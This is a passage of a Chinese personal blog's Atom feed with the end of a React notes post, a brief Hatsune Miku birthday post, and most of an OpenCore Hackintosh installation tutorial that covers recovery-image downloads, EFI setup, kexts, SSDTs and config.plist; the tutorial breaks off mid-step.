&#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ref</span>=<span class="string">&#123;this.myRef&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回调ref</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CustomTextInput</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">textInput</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">setTextInputRef</span> = <span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">textInput</span> = element;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 `ref` 的回调函数将 text 输入框 DOM 节点的引用存储到 React</span></span><br><span class="line">    <span class="comment">// 实例上（比如 this.textInput）</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">ref</span>=<span class="string">&#123;this.setTextInputRef&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        /&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>函数式组件不可以使用Ref，因为没有this</strong></li><li><strong>string形式ref不推荐使用</strong></li></ul><h3 id="十一、react中state的管理"><a href="#十一、react中state的管理" class="headerlink" title="十一、react中state的管理"></a>十一、react中state的管理</h3><ul><li>redux</li><li>react-redux</li></ul><h4 id="redux"><a href="#redux" class="headerlink" title="redux"></a>redux</h4><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;React速记，分为3个部分。每一个部分由简短且精悍的知识点组成。开发忘记可查看，初见学习可常翻&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h2&gt;&lt;h3 id=&quot;一、JSX&quot;&gt;&lt;a href=&quot;#一、JSX&quot; class=&quot;headerlink&quot; title=&quot;一、JSX&quot;&gt;&lt;/a&gt;一、JSX&lt;/h3&gt;&lt;figure class=&quot;highlight jsx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; element = &lt;span class=&quot;language-xml&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;Hello, world!&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;JavaScript和UI代码的结合&lt;/p&gt;
&lt;figure class=&quot;highlight jsx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; element = &lt;span class=&quot;language-xml&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;Hello, &amp;#123;name&amp;#125;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;用&lt;code&gt;&amp;#123;&amp;#125;&lt;/code&gt;包裹表达式（js表达式，变量）&lt;/p&gt;
&lt;figure class=&quot;highlight jsx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; element = &lt;span class=&quot;language-xml&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;className&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;#123;imgClass&amp;#125;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;#123;user.avatarUrl&amp;#125;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;class&lt;/code&gt;属性写为&lt;code&gt;className&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;属性用小驼峰语法&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight jsx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; element = &lt;span class=&quot;language-xml&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;Hello, world!&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title class_&quot;&gt;ReactDOM&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;render&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  element,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;variable language_&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;getElementById&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;一个可运行的React Hello World例子&lt;/p&gt;</summary>
    
    
    
    
    <category term="学习" scheme="https://mimonarchrd.gitee.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>HappyBirthdayMiku</title>
    <link href="https://mimonarchrd.gitee.io/2021/08/31/happyBirthdayMiku/"/>
    <id>https://mimonarchrd.gitee.io/2021/08/31/happyBirthdayMiku/</id>
    <published>2021-08-31T10:08:39.000Z</published>
    <updated>2021-09-04T13:11:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="生日快乐-Happy-Birthday-Hatsune-Miku-2021-8-31"><a href="#生日快乐-Happy-Birthday-Hatsune-Miku-2021-8-31" class="headerlink" title="生日快乐 Happy Birthday Hatsune Miku 2021.8.31"></a>生日快乐 Happy Birthday Hatsune Miku 2021.8.31</h2><p><img src="https://static.xiaoblogs.cn/img/beb1ac455f65f137924676a15494ff38a879bebf.gif" alt="にや Pixiv ID：9319"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;生日快乐-Happy-Birthday-Hatsune-Miku-2021-8-31&quot;&gt;&lt;a href=&quot;#生日快乐-Happy-Birthday-Hatsune-Miku-2021-8-31&quot; class=&quot;headerlink&quot; title=&quot;生日快乐 Hap</summary>
      
    
    
    
    
    <category term="生活" scheme="https://mimonarchrd.gitee.io/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>黑苹果opencore2021和win11做朋友</title>
    <link href="https://mimonarchrd.gitee.io/2021/07/25/%E9%BB%91%E8%8B%B9%E6%9E%9Copencore2021%E5%92%8Cwin11%E5%81%9A%E6%9C%8B%E5%8F%8B/"/>
    <id>https://mimonarchrd.gitee.io/2021/07/25/%E9%BB%91%E8%8B%B9%E6%9E%9Copencore2021%E5%92%8Cwin11%E5%81%9A%E6%9C%8B%E5%8F%8B/</id>
    <published>2021-07-25T14:01:26.000Z</published>
    <updated>2021-09-09T03:42:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>这一篇文章我是为了自己做一份装黑果教程的备份，同时发布到Hexo上去。也是给看到这一篇博客的人有一点的帮助吧  </p><div id="vBanner_Root">    <div id="vBanner_Container" style="background-image: linear-gradient(to bottom right, white ,#B3C6EC)">        <a href="">            <div id="vBanner_post" title="A-SOUL" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/ZZD7q421.png)"></div>        </a>        <div id="vLogo_Container">                                               <div id="vBanner_logo" style="background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/A-SOUL.png)"></div>                                             </div>    </div></div><p>首先请先关注下上面图片的五个货（B站搜索：A-Soul 名字在图片上有） </p><span id="more"></span><h2 id="一、逛贴吧、论坛、研究自己的配置、弄个能翻山越岭的网（很多东西都是GitHub下载，慢的要命）"><a href="#一、逛贴吧、论坛、研究自己的配置、弄个能翻山越岭的网（很多东西都是GitHub下载，慢的要命）" class="headerlink" title="一、逛贴吧、论坛、研究自己的配置、弄个能翻山越岭的网（很多东西都是GitHub下载，慢的要命）"></a>一、逛贴吧、论坛、研究自己的配置、弄个能翻山越岭的网（很多东西都是GitHub下载，慢的要命）</h2><p>有下面几个问题  </p><ul><li>知道基本的安装系统，系统如何设置BIOS</li><li>大概知道黑苹果和装win的不同</li><li>知道黑苹果相较白苹果体验上会有缺失  </li><li>你有足够的耐心吗 </li><li>你会英语吗 </li></ul><p>你的电脑配置：<br>首先，你的电脑是台式机吗？还是笔记本  </p><ul><li>台式机：我很赞成去装黑苹果，比笔记本的事情少多了  </li><li>笔记本：如果你就是为了去用黑苹果当主力，我建议你去用win11。如果是学习，建议备份好原来系统，之后试一试，最后还是用win</li></ul><p>之后，了解你的配置（这一点是很重要的，会让你知道你的设备能不能装黑苹果）<br>下面会放几个链接，链接到opencore官网，要求你能基本的看个懂，不过我相信我在这里提示链接是干什么的，你打开链接后应该能明白个七七八八  </p><ul><li>Intel因特尔CPU 和 AMD CPU支持列表：<a href="https://dortania.github.io/OpenCore-Install-Guide/macos-limits.html#cpu-support">https://dortania.github.io/OpenCore-Install-Guide/macos-limits.html#cpu-support</a>  </li><li>GPU 显卡支持列表（这里台式机强烈建议去弄一块免驱卡）：<a href="https://blog.daliansky.net/Mojave-Hardware-Support-List.html">https://blog.daliansky.net/Mojave-Hardware-Support-List.html</a>  </li><li>主板支持列表：<a href="https://dortania.github.io/OpenCore-Install-Guide/macos-limits.html#motherboard-support">https://dortania.github.io/OpenCore-Install-Guide/macos-limits.html#motherboard-support</a>  </li><li>无线网卡支持列表（建议因特尔和博通网卡）：<a href="https://post.smzdm.com/p/aekw8844/">https://post.smzdm.com/p/aekw8844/</a>  </li><li>硬盘（三星硬盘注意一下）：<a href="https://dortania.github.io/OpenCore-Install-Guide/macos-limits.html#storage-support">https://dortania.github.io/OpenCore-Install-Guide/macos-limits.html#storage-support</a>  </li></ul><p>我放下我的配置：  </p><ul><li>CPU：AMD Ryzen 锐龙 3600  </li><li>GPU：RX480 XFX OC  </li><li>主板：MSI微星 B450m 迫击炮max  </li><li>无线网卡：高通 AR 9565  </li><li>有线网卡：Realtek Gbyte</li><li>硬盘：西数 SN550  </li></ul><p>通过上面的链接，如果发现你的配置不符合，我劝你要么换配置，要么win11  </p><h2 id="二、大概要知道Opencore是什么，里面有那些术语，macOS相关的一些基本知识（启动过程中加载什么东西，启动流程等）"><a href="#二、大概要知道Opencore是什么，里面有那些术语，macOS相关的一些基本知识（启动过程中加载什么东西，启动流程等）" class="headerlink" title="二、大概要知道Opencore是什么，里面有那些术语，macOS相关的一些基本知识（启动过程中加载什么东西，启动流程等）"></a>二、大概要知道Opencore是什么，里面有那些术语，macOS相关的一些基本知识（启动过程中加载什么东西，启动流程等）</h2><p>小百科：<a href="https://dortania.github.io/OpenCore-Install-Guide/terminology.html">https://dortania.github.io/OpenCore-Install-Guide/terminology.html</a>  </p><h2 id="三、手动做一个usb-EFI引导盘"><a href="#三、手动做一个usb-EFI引导盘" class="headerlink" title="三、手动做一个usb EFI引导盘"></a>三、手动做一个usb EFI引导盘</h2><p>准备一个 8G 以上的U盘，这一步的目标就是制作一个可以通过U盘引导的macOS安装盘 </p><p>两个步骤：</p><ul><li>通过工具下载镜像</li><li>直接复制官方EFI文件夹，并剔除一些非必要的文件</li></ul><ol><li><p>使用工具下载macOS镜像<br>先下载<a href="https://github.com/acidanthera/OpenCorePkg/releases/">opencore</a><br>PS. 其中有两个版本，一个是release一个是debug。刚开始安装建议使用debug版本，会多显示一些安装的debug信息，能帮助你更好的安装系统，定位到错误（一般都是看卡住的代码）<br><img src="https://static.xiaoblogs.cn/img/20210727105233.png"><br>进入上图的位置（macrcovery文件夹中），在这个文件夹中我们要用到macrecovery.py这个文件(<strong>必须要安装好python环境</strong>)  </p><p>在Windows中，<code>鼠标右键</code> + <code>shift键</code> 即可以打开shell<br>在打开的shell中，输入下面的命令，来选择你要安装的macOS版本  </p><figure class="highlight py"><figcaption><span>下载镜像命令</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Lion(10.7):</span></span><br><span class="line">python macrecovery.py -b Mac-2E6FAB96566FE58C -m 00000000000F25Y00 download</span><br><span class="line">python macrecovery.py -b Mac-C3EC7CD22292981F -m 00000000000F0HM00 download</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mountain Lion(10.8):</span></span><br><span class="line">python macrecovery.py -b Mac-7DF2A3B5E5D671ED -m 00000000000F65100 download</span><br><span class="line">       </span><br><span class="line"><span class="comment"># Mavericks(10.9):</span></span><br><span class="line">python macrecovery.py -b Mac-F60DEB81FF30ACF6 -m 00000000000FNN100 download</span><br><span class="line">       </span><br><span class="line"><span class="comment"># Yosemite(10.10):</span></span><br><span class="line">python macrecovery.py -b Mac-E43C1C25D4880AD6 -m 00000000000GDVW00 download</span><br><span class="line">       </span><br><span class="line"><span class="comment"># El Capitan(10.11):</span></span><br><span class="line">python macrecovery.py -b Mac-FFE5EF870D7BA81A -m 00000000000GQRX00 download</span><br><span class="line">       </span><br><span class="line"><span class="comment"># Sierra(10.12):</span></span><br><span class="line">python macrecovery.py -b Mac-77F17D7DA9285301 -m 00000000000J0DX00 download</span><br><span class="line">       </span><br><span class="line"><span class="comment"># High Sierra(10.13)</span></span><br><span class="line">python macrecovery.py -b Mac-7BA5B2D9E42DDD94 -m 00000000000J80300 download</span><br><span class="line">python macrecovery.py -b Mac-BE088AF8C5EB4FA2 -m 00000000000J80300 download</span><br><span class="line">       </span><br><span class="line"><span class="comment"># Mojave(10.14)</span></span><br><span class="line">python macrecovery.py -b Mac-7BA5B2DFE22DDD8C -m 00000000000KXPG00 download</span><br><span class="line">       </span><br><span class="line"><span class="comment"># Catalina(10.15)</span></span><br><span class="line">python macrecovery.py -b Mac-00BE6ED71E35EB86 -m <span class="number">00000000000000000</span> download</span><br><span class="line">       </span><br><span class="line"><span class="comment"># Latest version</span></span><br><span class="line"><span class="comment"># ie. Big Sur(11)</span></span><br><span class="line">python macrecovery.py -b Mac-E43C1C25D4880AD6 -m <span class="number">00000000000000000</span> download  </span><br><span class="line">   </span><br></pre></td></tr></table></figure><p> 输入命令下载完成后如下图<br> <img src="https://static.xiaoblogs.cn/img/%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F%E5%AE%8C%E6%88%90.png">  </p><p> 在刚才的macrecovery文件夹下，会有两个下载好的文件<br> <img src="https://static.xiaoblogs.cn/img/%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F%E7%9A%84%E4%BD%8D%E7%BD%AE.png">  </p></li><li><p>复制EFI文件夹<br>复制之前，需要使用rufus工具（百度搜索下载或者使用我提供的工具包里有的rufus）  </p><p>格式化U盘<br><img src="https://static.xiaoblogs.cn/img/%E5%88%B6%E4%BD%9C%E5%B8%A6%E6%9C%89efi%E7%9A%84%E5%90%AF%E5%8A%A8u%E7%9B%98.png">  </p><p>按照上面的图片设置就可以  </p><p>格式化好后，复制下图的<code>IA32</code>或<code>X64</code>文件夹中的<strong>EFI</strong>文件夹到做好的U盘中去<br><img src="https://static.xiaoblogs.cn/img/20210727113705.png">  </p><p>需要剔除EFI中的一些文件，剔除完成后入下图<br><img src="https://static.xiaoblogs.cn/img/20210727114102.png">  </p><p><em><strong>PS.注意，教程只是针对使用UEFI引导方式、安装的系统为Catalina、BigSur等较为新的系统，以及于较为新的系统。如果你安装的是老系统，老机器。请仔细去官网查看不同</strong></em>  </p><p>之后，在U盘的根目录创建一个名为<code>com.apple.recovery.boot</code>的文件夹<br>把你下载的两个镜像文件复制进去  </p><p>最后你的U盘应该是这样的<br><img src="https://static.xiaoblogs.cn/img/20210727114728.png">  </p><p>不要管上图中EFI文件夹下的Microsoft文件夹，为什么会有那么一个文件夹，到双系统的时候你就明白了</p></li></ol><h2 id="四、找驱动（kext文件和Drivers文件夹下的文件）"><a href="#四、找驱动（kext文件和Drivers文件夹下的文件）" class="headerlink" title="四、找驱动（kext文件和Drivers文件夹下的文件）"></a>四、找驱动（kext文件和Drivers文件夹下的文件）</h2><p>简单来说</p><ul><li>kext：macOS的驱动  </li><li>Drivers文件夹：Opencore或者Clover需要的驱动  </li></ul><ol><li><p>Drivers文件夹下</p><p>必要文件：<a href="https://github.com/acidanthera/OcBinaryData/blob/master/Drivers/HfsPlus.efi">HfsPlus.efi</a>、<a href="https://github.com/acidanthera/OpenCorePkg/releases">OpenRuntime.efi</a>  </p><p>*** PS. 非UEFI的用户请仔细<a href="https://dortania.github.io/OpenCore-Install-Guide/ktext.html#legacy-users">看这里</a></p></li><li><p>Kexts文件夹下  </p><p>这里需要根据自己的电脑硬件配置去选择文件，所以你必须自己根据 <a href="https://dortania.github.io/OpenCore-Install-Guide/ktext.html#kexts">这个教程</a> 去到 <a href="http://kexts.goldfish64.com/">Kext仓库</a> 找到自己的驱动  </p><p>所有的驱动都搜集其应该和下面的图片差不多（主要不是一模一样，是差不多）<br><img src="https://static.xiaoblogs.cn/img/20210727121050.png">  </p></li></ol><h2 id="五、ACPI文件夹下的SSDT文件的添加"><a href="#五、ACPI文件夹下的SSDT文件的添加" class="headerlink" title="五、ACPI文件夹下的SSDT文件的添加"></a>五、ACPI文件夹下的SSDT文件的添加</h2><p>还是简单的说明下：</p><ul><li>ACPI：管理电源的一系列接口（包括EC控制器、开关机、唤醒睡眠、电池管理、设备用电管理、性能管理等）</li></ul><p>所以说，ACPI文件夹下的文件很重要。对于五花八门的硬件配置，也要用不同的ssdt.aml(ACPI Machine Language Binary)来对硬件修正让macOS能正确的识别  </p><p>所以你的任务就是使用一个工具，生成自己电脑的DSDT文件，通过这个DSDT文件，生成（根据下面的图片）所需的SSDT修正文件，之后放到ACPI文件夹即可  </p><ul><li>工具：<a href="https://github.com/corpnewt/SSDTTime">SSDTime</a></li></ul><p>SSDTime是最简单的方法，这个工具根据你的电脑配置会自动的生成一个DSDT文件之后会根据这个DSDT文件生成想要的修正SSDT文件  </p><hr><h3 id="制作SSDT文件基本步骤："><a href="#制作SSDT文件基本步骤：" class="headerlink" title="制作SSDT文件基本步骤："></a>制作SSDT文件基本步骤：</h3><ol><li><p>根据表格找到你的需要的SSDT文件<br>PS. 我仅仅只放一个链接，你必须点进去自己看自己的平台，因为有很多平台的信息，我只放我电脑平台的图片，其他平台类似<br><a href="https://dortania.github.io/OpenCore-Install-Guide/ktext.html#ssdts">各平台所需SSDT表格</a><br><img src="https://static.xiaoblogs.cn/img/20210727153905.png" alt="这里只是台式机的"></p></li><li><p>使用SSDTime工具  </p></li></ol><ul><li>使用工具生成DSDT</li><li>在工具中选择生成的DSDT</li><li>选择要的SSDT<br>基本就是上面的这几个步骤<br><img src="https://static.xiaoblogs.cn/img/ssdt%E5%B7%A5%E5%85%B7%E7%95%8C%E9%9D%A2.png"><br>上面的图就是SSDTime这个工具了  </li><li>选择<code>8</code>，自动生成DSDT</li><li>选择<code>D</code>，选择上一步自动生成的DSDT的路径</li><li>选择<code>1-7</code>，根据上面的SSDT所需表格或者那个链接里所述的，从1-7中选择自己需要的SSDT<br>eg.<br>我的平台是AMD Ryzen3000系，也就是AMD(17/19h)那一行，主板是B450 =&gt; 我需要的SSDT为：SSDT-EC。<br>如果是英特尔Intel 8代，那就是需要：SSDT-PLUG、SSDT-EC、SSDT-AWAC、SSDT-PWC  </li></ul><ol start="3"><li>针对一些配置的说明（重要）<br>SSDTime好用，但是自动生成的一些SSDT修正可能还是会有问题，这个时候需要你手动的去修正。以8代SSDT-AWAC修正为例<br>macOS中需要开启RTC0时钟，需要禁止掉AWAC时钟  <ul><li>需要使用工具反编译DSDT.aml</li><li>打开反编译后的DSDT.dsl  </li><li>搜索<code>PNP0B00</code>，如果定位到了，说明可以禁止AWAC时钟，会在下面的编辑config.plist中禁止。如果没有定位到，就需要继续往下走</li><li>搜索<code>Name (_ADR, 0x001F0000)</code>，定位LPC的路径</li><li>下载SSDT-RTC0的模板文件</li><li>替换<code>PCI0.LPCB</code>为<code>PCI0.LPC</code></li><li>完成后编译DSDT.dsl为DSDT.aml</li><li>使用SSDTime生成SSDT-AWAC文件<br>注意：上面仅仅为一个过程，没有任何原理的描述。简单来讲就是手动的替换设备名字、地址来做修正，更多的修正参加<a href="https://dortania.github.io/Getting-Started-With-ACPI/#a-quick-explainer-on-acpi">官网ACPI教程</a></li></ul></li></ol><h2 id="六、配置config-plist文件"><a href="#六、配置config-plist文件" class="headerlink" title="六、配置config.plist文件"></a>六、配置config.plist文件</h2><p>config.plist是什么：macOS属性配置表<br>要修改的属性：  </p><ul><li>ACPI</li><li>Booter</li><li>DeviceProperties</li><li>Kernel</li><li>Misc</li><li>NVRAM</li><li>PlatformInfo</li><li>UEFI<br>这一步很关键，一个选项配置错误就会导致卡代码，或者安装出错等等问题，耐心一点  </li></ul><ol><li>拷贝下载的opencore中的config.plist模板，放到EFI/OC目录下<br><img src="https://static.xiaoblogs.cn/img/20210727165321.png"></li><li>使用 <a href="https://github.com/corpnewt/ProperTree">ProperTree</a> 编辑刚刚复制的config.plist  </li><li>点击下面的链接，根据自己的配置选择对应的config编辑教程<br><a href="https://dortania.github.io/OpenCore-Install-Guide/config.plist/#selecting-your-platform">不同平台config.plist教程</a>  </li></ol><hr><h4 id="请认真根据我提供的链接去一个属性一个属性的修改，官网对于要修改的属性对都用红色框标出，并且注明了哪些平台要修改，那些不需要修改。这里我没法把所有平台的教程都写到博客里，但如果写了我的平台如何去编辑config，就会有人完全按照我的config去编辑，这也是不行的。每个人都是独一份的黑苹果，请努力啃一下英文的官网"><a href="#请认真根据我提供的链接去一个属性一个属性的修改，官网对于要修改的属性对都用红色框标出，并且注明了哪些平台要修改，那些不需要修改。这里我没法把所有平台的教程都写到博客里，但如果写了我的平台如何去编辑config，就会有人完全按照我的config去编辑，这也是不行的。每个人都是独一份的黑苹果，请努力啃一下英文的官网" class="headerlink" title="请认真根据我提供的链接去一个属性一个属性的修改，官网对于要修改的属性对都用红色框标出，并且注明了哪些平台要修改，那些不需要修改。这里我没法把所有平台的教程都写到博客里，但如果写了我的平台如何去编辑config，就会有人完全按照我的config去编辑，这也是不行的。每个人都是独一份的黑苹果，请努力啃一下英文的官网"></a>请认真根据我提供的链接去一个属性一个属性的修改，官网对于要修改的属性对都用红色框标出，并且注明了哪些平台要修改，那些不需要修改。这里我没法把所有平台的教程都写到博客里，但如果写了我的平台如何去编辑config，就会有人完全按照我的config去编辑，这也是不行的。每个人都是独一份的黑苹果，请努力啃一下英文的官网</h4><hr><h2 id="七、BIOS设置"><a href="#七、BIOS设置" class="headerlink" title="七、BIOS设置"></a>七、BIOS设置</h2><p>编辑完自己的config后，都有对应的BIOS设置。注意，一定要确保官网提到的每一个BIOS选项都可以设置，如果某一项BIOS设置找不到，需要考虑去config解锁。如果也没法解锁，可以暂且忽略，但是要看后面的安装部分能不能进入  </p><h2 id="八、格式化硬盘，建立EFI分区"><a href="#八、格式化硬盘，建立EFI分区" class="headerlink" title="八、格式化硬盘，建立EFI分区"></a>八、格式化硬盘，建立EFI分区</h2><ol><li>做一个winPE  </li><li>使用一般winPE都有的diskGenius工具，将你要安装的硬盘<code>删除所有分区</code>=&gt; <code>新建分区</code> =&gt; <code>建立一个200MB的ESP分区</code> 就可以了，不需要再建立其他分区  </li></ol><h2 id="九、安装macOS"><a href="#九、安装macOS" class="headerlink" title="九、安装macOS"></a>九、安装macOS</h2><ol><li>插上U盘，在BIOS里选择U盘启动</li><li>如果顺利进入下图，就继续走下面的步骤，否则就去检查代码，改config或者设置BIOS<br><img src="https://static.xiaoblogs.cn/img/macos%E6%81%A2%E5%A4%8D%E7%95%8C%E9%9D%A2.png"></li><li>选择<code>磁盘工具</code>，选择你上一步格式化的磁盘，点击<code>抹掉</code>，格式选择<code>APFS</code><br><img src="https://static.xiaoblogs.cn/img/macos%E7%A3%81%E7%9B%98%E5%B7%A5%E5%85%B7%E6%A0%BC%E5%BC%8F%E5%8C%96%E7%A3%81%E7%9B%98.png"></li><li>好了，关掉磁盘工具，选择<code>重新安装macOS Big Sur</code></li></ol><hr><h1 id="安装完macOS强烈建议做的一些事情"><a href="#安装完macOS强烈建议做的一些事情" class="headerlink" title="安装完macOS强烈建议做的一些事情"></a>安装完macOS强烈建议做的一些事情</h1><h2 id="①-摆脱U盘，直接从硬盘的EFI启动macOS"><a href="#①-摆脱U盘，直接从硬盘的EFI启动macOS" class="headerlink" title="① 摆脱U盘，直接从硬盘的EFI启动macOS"></a>① 摆脱U盘，直接从硬盘的EFI启动macOS</h2><p>PS. 如果你说我插U盘启动也没关系，那可以跳过  </p><ol><li><code>command</code>（win徽标键） + <code>空格</code> 打开聚焦搜索，搜索Terminal终端</li><li>使用 <code>sudo diskutil list</code> 命令查找EFI盘标识符<br><img src="https://static.xiaoblogs.cn/img/20210727174107.png"><br>我的盘的EFI标识符为：disk0s1</li><li>使用 